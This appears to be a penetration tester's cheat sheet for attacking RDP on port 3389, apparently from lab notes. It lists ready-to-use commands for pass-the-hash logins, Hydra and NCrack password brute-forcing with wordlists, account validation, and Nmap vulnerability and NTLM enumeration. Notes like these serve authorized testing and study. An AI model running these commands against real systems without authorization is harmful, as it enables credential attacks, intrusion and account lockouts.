## RDP

**Default port: 3389**

### Connecting using Credentials or Hash

    rdesktop -u <username> <IP>
    rdesktop -d <domain> -u <username> -p <password> <IP>
    xfreerdp /u:[domain\]<username> /p:<password> /v:<IP>
    xfreerdp /u:[domain\]<username> /pth:<hash> /v:<IP>

### Brute Force Attack
  
  Be careful, you could lock accounts

  https://github.com/yofbalibump/RDPbruteforcer

**Hydra**

 	hydra -t 1 -V -f -l administrator -P /home/kali/Desktop/rockyou.txt rdp://10.11.1.7

**NCrack** not tested

	ncrack -vv --user Administrator -P /home/kali/Desktop/1000-most-common-passwords.txt rdp://10.11.1.7


### Check Account

  test whether account is valid on the target host.
  
  https://github.com/SecureAuthCorp/impacket/blob/master/examples/rdp_check.py
  
  `rdp_check <domain>/<name>:<password>@<IP>`
  
### NMap
  
  It checks the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).
  
  `nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>`
